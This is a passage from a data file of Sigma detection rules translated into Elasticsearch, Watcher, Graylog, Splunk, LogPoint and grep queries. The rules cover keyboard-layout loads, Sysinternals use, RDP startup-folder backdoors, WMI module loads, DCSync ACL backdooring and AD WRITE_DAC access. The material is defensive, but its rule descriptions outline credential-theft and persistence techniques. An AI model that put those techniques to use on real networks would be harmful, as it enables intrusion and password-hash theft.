- '*\\Keyboard Layout\\Preload\\*'\n            - '*\\Keyboard Layout\\Substitutes\\*'\n        Details: \n            - 00000429  # Persian (Iran)\n            - 00050429  # Persian (Iran)\n            - 0000042a  # Vietnamese\n    condition: selection_registry\nfalsepositives:\n    - \"Administrators or users that actually use the selected keyboard layouts (heavily depends on the organisation's user base)\"\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\Keyboard\\\\ Layout\\\\\\\\Preload\\\\* OR *\\\\\\\\Keyboard\\\\ Layout\\\\\\\\Substitutes\\\\*) AND Details:(\"00000429\" OR \"00050429\" OR \"0000042a\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Keyboard-Layout-Load <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Keyboard Layout Load\",\\n    \"description\": \"Detects the keyboard preload installation with a suspicious keyboard layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems maintained by US staff only\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\Keyboard\\\\\\\\ Layout\\\\\\\\\\\\\\\\Preload\\\\\\\\* OR *\\\\\\\\\\\\\\\\Keyboard\\\\\\\\ Layout\\\\\\\\\\\\\\\\Substitutes\\\\\\\\*) AND Details:(\\\\\"00000429\\\\\" OR \\\\\"00050429\\\\\" OR \\\\\"0000042a\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\Keyboard\\\\\\\\ Layout\\\\\\\\\\\\\\\\Preload\\\\\\\\* OR *\\\\\\\\\\\\\\\\Keyboard\\\\\\\\ Layout\\\\\\\\\\\\\\\\Substitutes\\\\\\\\*) AND Details:(\\\\\"00000429\\\\\" OR \\\\\"00050429\\\\\" OR \\\\\"0000042a\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Keyboard Layout Load\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\Keyboard Layout\\\\\\\\Preload\\\\* *\\\\\\\\Keyboard Layout\\\\\\\\Substitutes\\\\*) AND Details:(\"00000429\" \"00050429\" \"0000042a\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\Keyboard Layout\\\\\\\\Preload\\\\*\" OR TargetObject=\"*\\\\\\\\Keyboard Layout\\\\\\\\Substitutes\\\\*\") (Details=\"00000429\" OR Details=\"00050429\" OR Details=\"0000042a\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\Keyboard Layout\\\\\\\\Preload\\\\*\", \"*\\\\\\\\Keyboard Layout\\\\\\\\Substitutes\\\\*\"] Details IN [\"00000429\", \"00050429\", \"0000042a\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\Keyboard Layout\\\\Preload\\\\.*|.*.*\\\\Keyboard Layout\\\\Substitutes\\\\.*))(?=.*(?:.*00000429|.*00050429|.*0000042a)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "action: global\ntitle: Usage of Sysinternals Tools\nid: 25ffa65d-76d8-4da5-a832-3f2b0136e133\nstatus: experimental\ndescription: Detects the usage of Sysinternals Tools due to accepteula key being added to Registry\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\ndate: 2017/08/28\nauthor: Markus Neis\ndetection:\n    condition: 1 of them\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same Registry Key\nlevel: low\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\EulaAccepted)\\nCommandLine.keyword:*\\\\ \\\\-accepteula*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Usage-of-Sysinternals-Tools <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Usage of Sysinternals Tools\",\\n    \"description\": \"Detects the usage of Sysinternals Tools due to accepteula key being added to Registry\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\EulaAccepted)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\EulaAccepted)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Usage of Sysinternals Tools\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Usage-of-Sysinternals-Tools-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Usage of Sysinternals Tools\",\\n    \"description\": \"Detects the usage of Sysinternals Tools due to accepteula key being added to Registry\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\ \\\\\\\\-accepteula*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\ \\\\\\\\-accepteula*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Usage of Sysinternals Tools\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\EulaAccepted)\\nCommandLine.keyword:* \\\\-accepteula*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" TargetObject=\"*\\\\\\\\EulaAccepted\")\\nCommandLine=\"* -accepteula*\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject=\"*\\\\\\\\EulaAccepted\")\\n(event_id=\"1\" CommandLine=\"* -accepteula*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*.*\\\\EulaAccepted))'\\ngrep -P '^.* -accepteula.*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Hijack legit RDP session to move laterally\nid: 52753ea4-b3a0-4365-910d-36cff487b789\nstatus: experimental\ndescription: Detects the usage of tsclient share to place a backdoor on the RDP source machine's startup folder\ndate: 2019/02/21\nauthor: Samir Bousseaden\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        Image: '*\\mstsc.exe'\n        TargetFileName: '*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\\*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND Image.keyword:*\\\\\\\\mstsc.exe AND TargetFileName.keyword:*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Start\\\\ Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Hijack-legit-RDP-session-to-move-laterally <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Hijack legit RDP session to move laterally\",\\n    \"description\": \"Detects the usage of tsclient share to place a backdoor on the RDP source machine\\'s startup folder\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\mstsc.exe AND TargetFileName.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Start\\\\\\\\ Menu\\\\\\\\\\\\\\\\Programs\\\\\\\\\\\\\\\\Startup\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\mstsc.exe AND TargetFileName.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Start\\\\\\\\ Menu\\\\\\\\\\\\\\\\Programs\\\\\\\\\\\\\\\\Startup\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Hijack legit RDP session to move laterally\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND Image.keyword:*\\\\\\\\mstsc.exe AND TargetFileName.keyword:*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" Image=\"*\\\\\\\\mstsc.exe\" TargetFileName=\"*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" Image=\"*\\\\\\\\mstsc.exe\" TargetFileName=\"*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*.*\\\\mstsc\\\\.exe)(?=.*.*\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1047 WMI Modules Loaded\nid: 671bb7e3-a020-4824-a00e-2ee5b55f385e\ndescription: Detects non wmiprvse loading WMI modules\nstatus: experimental\ndate: 2019/08/10\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1047_windows_management_instrumentation/wmi_wmi_module_load.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\wmiclnt.dll'\n            - '\\WmiApRpl.dll'\n            - '\\wmiprov.dll'\n            - '\\wmiutils.dll'\n            - '\\wbemcomn.dll'\n            - '\\wbemprox.dll'\n            - '\\WMINet_Utils.dll'\n            - '\\wbemsvc.dll'\n            - '\\fastprox.dll'\n    filter:\n        Image|endswith:\n            - '\\WmiPrvSe.exe'\n            - '\\WmiAPsrv.exe'\n            - '\\svchost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\wmiclnt.dll OR *\\\\\\\\WmiApRpl.dll OR *\\\\\\\\wmiprov.dll OR *\\\\\\\\wmiutils.dll OR *\\\\\\\\wbemcomn.dll OR *\\\\\\\\wbemprox.dll OR *\\\\\\\\WMINet_Utils.dll OR *\\\\\\\\wbemsvc.dll OR *\\\\\\\\fastprox.dll)) AND (NOT (Image.keyword:(*\\\\\\\\WmiPrvSe.exe OR *\\\\\\\\WmiAPsrv.exe OR *\\\\\\\\svchost.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1047-WMI-Modules-Loaded <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1047 WMI Modules Loaded\",\\n    \"description\": \"Detects non wmiprvse loading WMI modules\",\\n    \"tags\": \"\",\\n    \"query\": \"((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\wmiclnt.dll OR *\\\\\\\\\\\\\\\\WmiApRpl.dll OR *\\\\\\\\\\\\\\\\wmiprov.dll OR *\\\\\\\\\\\\\\\\wmiutils.dll OR *\\\\\\\\\\\\\\\\wbemcomn.dll OR *\\\\\\\\\\\\\\\\wbemprox.dll OR *\\\\\\\\\\\\\\\\WMINet_Utils.dll OR *\\\\\\\\\\\\\\\\wbemsvc.dll OR *\\\\\\\\\\\\\\\\fastprox.dll)) AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\WmiPrvSe.exe OR *\\\\\\\\\\\\\\\\WmiAPsrv.exe OR *\\\\\\\\\\\\\\\\svchost.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\wmiclnt.dll OR *\\\\\\\\\\\\\\\\WmiApRpl.dll OR *\\\\\\\\\\\\\\\\wmiprov.dll OR *\\\\\\\\\\\\\\\\wmiutils.dll OR *\\\\\\\\\\\\\\\\wbemcomn.dll OR *\\\\\\\\\\\\\\\\wbemprox.dll OR *\\\\\\\\\\\\\\\\WMINet_Utils.dll OR *\\\\\\\\\\\\\\\\wbemsvc.dll OR *\\\\\\\\\\\\\\\\fastprox.dll)) AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\WmiPrvSe.exe OR *\\\\\\\\\\\\\\\\WmiAPsrv.exe OR *\\\\\\\\\\\\\\\\svchost.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1047 WMI Modules Loaded\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\wmiclnt.dll *\\\\\\\\WmiApRpl.dll *\\\\\\\\wmiprov.dll *\\\\\\\\wmiutils.dll *\\\\\\\\wbemcomn.dll *\\\\\\\\wbemprox.dll *\\\\\\\\WMINet_Utils.dll *\\\\\\\\wbemsvc.dll *\\\\\\\\fastprox.dll)) AND (NOT (Image.keyword:(*\\\\\\\\WmiPrvSe.exe *\\\\\\\\WmiAPsrv.exe *\\\\\\\\svchost.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"7\" (ImageLoaded=\"*\\\\\\\\wmiclnt.dll\" OR ImageLoaded=\"*\\\\\\\\WmiApRpl.dll\" OR ImageLoaded=\"*\\\\\\\\wmiprov.dll\" OR ImageLoaded=\"*\\\\\\\\wmiutils.dll\" OR ImageLoaded=\"*\\\\\\\\wbemcomn.dll\" OR ImageLoaded=\"*\\\\\\\\wbemprox.dll\" OR ImageLoaded=\"*\\\\\\\\WMINet_Utils.dll\" OR ImageLoaded=\"*\\\\\\\\wbemsvc.dll\" OR ImageLoaded=\"*\\\\\\\\fastprox.dll\")) NOT ((Image=\"*\\\\\\\\WmiPrvSe.exe\" OR Image=\"*\\\\\\\\WmiAPsrv.exe\" OR Image=\"*\\\\\\\\svchost.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"7\" ImageLoaded IN [\"*\\\\\\\\wmiclnt.dll\", \"*\\\\\\\\WmiApRpl.dll\", \"*\\\\\\\\wmiprov.dll\", \"*\\\\\\\\wmiutils.dll\", \"*\\\\\\\\wbemcomn.dll\", \"*\\\\\\\\wbemprox.dll\", \"*\\\\\\\\WMINet_Utils.dll\", \"*\\\\\\\\wbemsvc.dll\", \"*\\\\\\\\fastprox.dll\"])  -(Image IN [\"*\\\\\\\\WmiPrvSe.exe\", \"*\\\\\\\\WmiAPsrv.exe\", \"*\\\\\\\\svchost.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*7)(?=.*(?:.*.*\\\\wmiclnt\\\\.dll|.*.*\\\\WmiApRpl\\\\.dll|.*.*\\\\wmiprov\\\\.dll|.*.*\\\\wmiutils\\\\.dll|.*.*\\\\wbemcomn\\\\.dll|.*.*\\\\wbemprox\\\\.dll|.*.*\\\\WMINet_Utils\\\\.dll|.*.*\\\\wbemsvc\\\\.dll|.*.*\\\\fastprox\\\\.dll))))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\WmiPrvSe\\\\.exe|.*.*\\\\WmiAPsrv\\\\.exe|.*.*\\\\svchost\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Powerview Add-DomainObjectAcl DCSync AD Extend Right\nid: 2c99737c-585d-4431-b61a-c911d86ff32f\ndescription: backdooring domain object to grant the rights associated with DCSync to a regular user or machine account using Powerview\\Add-DomainObjectAcl DCSync\n    Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer\nstatus: experimental\ndate: 2019/04/03\nauthor: Samir Bousseaden; Roberto Rodriguez @Cyb3rWard0g; oscd.community\nreferences:\n    - https://twitter.com/menasec1/status/1111556090137903104\n    - https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf\ntags:\n    - attack.credential_access\n    - attack.persistence\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5136\n        LDAPDisplayName: 'ntSecurityDescriptor'\n        Value|contains: \n         - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n         - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n         - '89e95b76-444d-4c62-991a-0facbeda640c'\n    condition: selection\nfalsepositives:\n    - New Domain Controller computer account, check user SIDs witin the value attribute of event 5136 and verify if it's a regular user or DC computer account.\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5136\" AND LDAPDisplayName:\"ntSecurityDescriptor\" AND Value.keyword:(*1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* OR *1131f6aa\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* OR *89e95b76\\\\-444d\\\\-4c62\\\\-991a\\\\-0facbeda640c*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Powerview-Add-DomainObjectAcl-DCSync-AD-Extend-Right <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Powerview Add-DomainObjectAcl DCSync AD Extend Right\",\\n    \"description\": \"backdooring domain object to grant the rights associated with DCSync to a regular user or machine account using Powerview\\\\\\\\Add-DomainObjectAcl DCSync Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5136\\\\\" AND LDAPDisplayName:\\\\\"ntSecurityDescriptor\\\\\" AND Value.keyword:(*1131f6ad\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *1131f6aa\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *89e95b76\\\\\\\\-444d\\\\\\\\-4c62\\\\\\\\-991a\\\\\\\\-0facbeda640c*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5136\\\\\" AND LDAPDisplayName:\\\\\"ntSecurityDescriptor\\\\\" AND Value.keyword:(*1131f6ad\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *1131f6aa\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *89e95b76\\\\\\\\-444d\\\\\\\\-4c62\\\\\\\\-991a\\\\\\\\-0facbeda640c*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Powerview Add-DomainObjectAcl DCSync AD Extend Right\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5136\" AND LDAPDisplayName:\"ntSecurityDescriptor\" AND Value.keyword:(*1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* *1131f6aa\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* *89e95b76\\\\-444d\\\\-4c62\\\\-991a\\\\-0facbeda640c*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5136\" LDAPDisplayName=\"ntSecurityDescriptor\" (Value=\"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\" OR Value=\"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*\" OR Value=\"*89e95b76-444d-4c62-991a-0facbeda640c*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5136\" LDAPDisplayName=\"ntSecurityDescriptor\" Value IN [\"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\", \"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*\", \"*89e95b76-444d-4c62-991a-0facbeda640c*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5136)(?=.*ntSecurityDescriptor)(?=.*(?:.*.*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.*|.*.*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2.*|.*.*89e95b76-444d-4c62-991a-0facbeda640c.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1000 AD Object WriteDAC Access\nid: 028c7842-4243-41cd-be6f-12f3cf1a26c7\ndescription: Detects WRITE_DAC access to a domain object\nstatus: experimental\ndate: 2019/09/12\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/05_defense_evasion/T1222_file_permissions_modification/ad_replication_user_backdoor.md\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 4662\n        ObjectServer: 'DS'\n        AccessMask: 0x40000\n        ObjectType:\n            - '19195a5b-6da0-11d0-afd3-00c04fd930c9'\n            - 'domainDNS'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4662\" AND ObjectServer:\"DS\" AND AccessMask:\"262144\" AND ObjectType:(\"19195a5b\\\\-6da0\\\\-11d0\\\\-afd3\\\\-00c04fd930c9\" OR \"domainDNS\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1000-AD-Object-WriteDAC-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1000 AD Object WriteDAC Access\",\\n    \"description\": \"Detects WRITE_DAC access to a domain object\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"4662\\\\\" AND ObjectServer:\\\\\"DS\\\\\" AND 